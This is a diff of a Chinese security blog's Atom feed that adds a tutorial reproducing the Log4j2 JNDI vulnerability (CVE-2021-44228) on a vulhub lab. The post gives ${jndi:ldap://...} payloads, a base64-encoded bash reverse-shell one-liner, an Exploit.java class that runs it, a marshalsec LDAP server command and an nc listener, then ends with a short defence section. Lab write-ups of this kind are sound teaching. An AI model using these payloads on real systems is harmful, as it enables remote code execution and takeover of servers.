@@ -3,12 +3,126 @@
     <id>https://lib0gus.github.io</id>
     <title>朝闻道 夕死可矣</title>
     <link href="https://lib0gus.github.io" />
-    <updated>2026-04-01T11:08:19.000Z</updated>
+    <updated>2026-04-01T13:59:12.000Z</updated>
     <category term="Java代码审计" />
     <category term="Java安全" />
     <category term="Hexo" />
     <category term="ShokaX" />
     <category term="环境问题" />
+    <entry>
+        <id>https://lib0gus.github.io/2026/04/01/Java%E5%AE%89%E5%85%A8%E4%B9%8BLog4j2/</id>
+        <title>Java安全之Log4j2</title>
+        <link rel="alternate" href="https://lib0gus.github.io/2026/04/01/Java%E5%AE%89%E5%85%A8%E4%B9%8BLog4j2/"/>
+        <content type="html">&lt;h1 id=&#34;什么是log4j2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是log4j2&#34;&gt;#&lt;/a&gt; 什么是Log4j2&lt;/h1&gt;
+&lt;p&gt;顾名思义，log4j2是一个开源的日志库。它是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。&lt;/p&gt;
+&lt;h1 id=&#34;为什么会出现该漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#为什么会出现该漏洞&#34;&gt;#&lt;/a&gt; 为什么会出现该漏洞&lt;/h1&gt;
+&lt;p&gt;正常来说，后台捕获一条日志就直接给他当作字符串输出出来了。但是log4j2的lookup方法遇到${}这个格式的字符串会自动去查找并解析执行里面的内容。且日志获取的地方有很多，比如HTTP头、请求参数、登录名等等都有可能被捕获，而且很多应用在默认配置下就会记录这些信息。除了入口多，Log4j2 还被海量 Java 应用、中间件、云服务间接依赖，很多开发者甚至不知道自己用了它。所以它影响范围大，利用难度低，漏洞危害严重。&lt;/p&gt;
+&lt;p&gt;为什么要设计Lookup功能&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;核心目的：让日志系统更灵活、更强大，能够在运行时动态获取信息并记录。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在复杂的企业级应用中，日志内容常常需要包含一些运行时信息，例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;当前服务器的 IP 地址&lt;/li&gt;
+&lt;li&gt;Java 系统属性（&lt;code&gt;java.version&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;环境变量（&lt;code&gt;env:USER&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;容器或框架的上下文信息&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果使用 Lookup，开发者只需在日志配置或代码中写 &lt;code&gt;${java:version}&lt;/code&gt;，Log4j2 就会自动填充真实值，&lt;strong&gt;无需在代码中显式获取这些信息&lt;/strong&gt;。这降低了代码侵入性，提高了配置的灵活性。&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h1&gt;
+&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
+&lt;p&gt;我们这里使用docker来搭建靶场做演示&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#998418;--shiki-dark:#B8A965&#34;&gt;cd&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; vulhub-master/log4j/CVE-2021-44228/&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;docker-compose&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; up&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt; -d&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们使用命令来查看靶场地址&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;docker&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; ps&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775053916450.png&#34; alt=&#34;1775053916450&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;攻击复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击复现&#34;&gt;#&lt;/a&gt; 攻击复现&lt;/h2&gt;
+&lt;p&gt;进入后是一个后台管理的页面&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775053951713.png&#34; alt=&#34;1775053951713&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们随便找一个功能点点击后抓包，得到一个数据包如下&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775054184177.png&#34; alt=&#34;1775054184177&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们来修改一下action参数使其报错&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775054223656.png&#34; alt=&#34;1775054223656&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;进入靶场日志后台我们可以看到刚才报错的日志，发现1111111被记录了下来。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775054261148.png&#34; alt=&#34;1775054261148&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们可以先使用&lt;a href=&#34;https://www.callback.red/&#34;&gt;doslog&lt;/a&gt;来检测一下&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;http://192.168.35.167:8983/solr/admin/cores?_=1775053577222&amp;#x26;action=$&lt;/span&gt;&lt;span style=&#34;color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&#34;&gt;jndi&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&#34;&gt;ldap:&lt;/span&gt;&lt;span style=&#34;color:#A0ADA0;--shiki-dark:#758575DD&#34;&gt;//w1m4.callback.red}&amp;#x26;core=demo&amp;#x26;other=1&amp;#x26;wt=json&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;此时成功实现报错，并且我们刚才知道，action里的数据会被日志记录&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775054431820.png&#34; alt=&#34;1775054431820&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们查看dnslog服务，发现有一条记录&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775054451312.png&#34; alt=&#34;1775054451312&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这就说明log4j2的lookup功能成功查找并解析该命令&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用获取反弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用获取反弹shell&#34;&gt;#&lt;/a&gt; 漏洞利用（获取反弹shell）&lt;/h2&gt;
+&lt;p&gt;我们先编写以下的恶意文件Exploit.java，我们反弹shell监听ip为192.168.35.128的9998端口，因此对应的bash命令为&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;bash&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt; -i&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;&gt;&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;&amp;#x26;&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; /dev/tcp/192.168.35.128/7777&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt; 0&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;&gt;&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;&amp;#x26;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;但是因为命令中的/&amp;lt;&amp;gt;&amp;amp;会被过滤或者编码，容易被拦截。所以我们对命令进行&lt;a href=&#34;https://ares-x.com/tools/runtime-exec&#34;&gt;base64编码&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775054845664.png&#34; alt=&#34;1775054845664&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;得到命令为&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;bash&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt; -c&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM1LjEyOC83Nzc3IDA+JjE=}&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;base64,-d&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;bash,-i&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;所以我们的恶意文件为Exploit.java&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt;import&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt; java&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt;import&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt; java&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;Process&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;public&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt; class&lt;/span&gt;&lt;span style=&#34;color:#2E8F82;--shiki-dark:#5DA994&#34;&gt; Exploit&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;     public&lt;/span&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt; Exploit&lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt;             try&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B07D48;--shiki-dark:#BD976A&#34;&gt;                 Runtime&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#a13865;--shiki-dark:#d9739f&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#a13865;--shiki-dark:#d9739f&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#a13865;--shiki-dark:#d9739f&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;&#34;&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM1LjEyOC83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;&#34;&lt;/span&gt;&lt;span style=&#34;color:#a13865;--shiki-dark:#d9739f&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;                                &lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt;catch&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;Exception &lt;/span&gt;&lt;span style=&#34;color:#B07D48;--shiki-dark:#BD976A&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B07D48;--shiki-dark:#BD976A&#34;&gt;                                            e&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#a13865;--shiki-dark:#d9739f&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#a13865;--shiki-dark:#d9739f&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;                                             &lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;                &lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;         public&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt; static&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt; void&lt;/span&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt; main&lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#B07D48;--shiki-dark:#BD976A&#34;&gt; argv&lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;                         Exploit&lt;/span&gt;&lt;span style=&#34;color:#B07D48;--shiki-dark:#BD976A&#34;&gt; e&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt; =&lt;/span&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt; new&lt;/span&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt; Exploit&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;                            &lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对其进行编译（注：此处为了兼容尽量使用jdk版本为1.8）,得到恶意文件&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;javac Exploit.java&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们将恶意文件放到kali攻击机里，开启一个http服务&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;python&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt; -m&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; http.server&lt;/span&gt;&lt;span style=&#34;color:#2F798A;--shiki-dark:#4C9A91&#34;&gt; 4444&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们在攻击机里启动LDAP服务&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;java&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt; -cp&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; marshalsec-0.0.3-SNAPSHOT-all.jar&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; marshalsec.jndi.LDAPRefServer&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;  &#34;&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;http://192.168.35.128:4444/#Exploit&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;&#34;&lt;/span&gt;&lt;span style=&#34;color:#2F798A;--shiki-dark:#4C9A91&#34;&gt; 1389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;此处的ip地址为http服务的ip地址，端口为http服务的端口。最后的端口为LDAP的端口，自定义即可&lt;/p&gt;
+&lt;p&gt;随后，我们来监听恶意文件中的端口&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;nc&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt; -lvnp&lt;/span&gt;&lt;span style=&#34;color:#2F798A;--shiki-dark:#4C9A91&#34;&gt; 7777&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775055755353.png&#34; alt=&#34;1775055755353&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;最后执行攻击，JNDI注入，我们在使用刚才的漏洞点来构造payload如下&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;http://192.168.35.167:8983/solr/admin/cores?action=$&lt;/span&gt;&lt;span style=&#34;color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&#34;&gt;jndi&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&#34;&gt;ldap:&lt;/span&gt;&lt;span style=&#34;color:#A0ADA0;--shiki-dark:#758575DD&#34;&gt;//192.168.35.128:1389/Exploit}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;访问该链接，实现报错&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775055790587.png&#34; alt=&#34;1775055790587&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;成功实现反弹shell&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775055819028.png&#34; alt=&#34;1775055819028&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;此时的http服务与LDAP服务日志如下&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775055853975.png&#34; alt=&#34;1775055853975&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;防御措施&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御措施&#34;&gt;#&lt;/a&gt; 防御措施&lt;/h1&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;设计初衷&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;安全缺陷&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;动态获取运行时信息，减少硬编码&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;未对输入来源做区分，导致用户输入也能触发 Lookup&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;集成 JNDI 资源，方便企业应用&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;默认允许从远程 LDAP/RMI 加载代码，且无任何限制&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;提升配置灵活性，降低维护成本&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;忽视了“日志内容可能来自攻击者”的安全边界&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;所以说，Log4j2 开启 Lookup 功能并非“故意留后门”，而是&lt;strong&gt;当时安全设计理念落后于功能演进的结果&lt;/strong&gt;。漏洞爆发后，社区迅速调整了默认安全策略，将便利性置于安全之后，这也是开源软件在安全事件中快速成熟的体现。&lt;/p&gt;
+&lt;h2 id=&#34;1-将-log4j2-升级到安全版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-将-log4j2-升级到安全版本&#34;&gt;#&lt;/a&gt; 1、将 Log4j2 升级到安全版本&lt;/h2&gt;
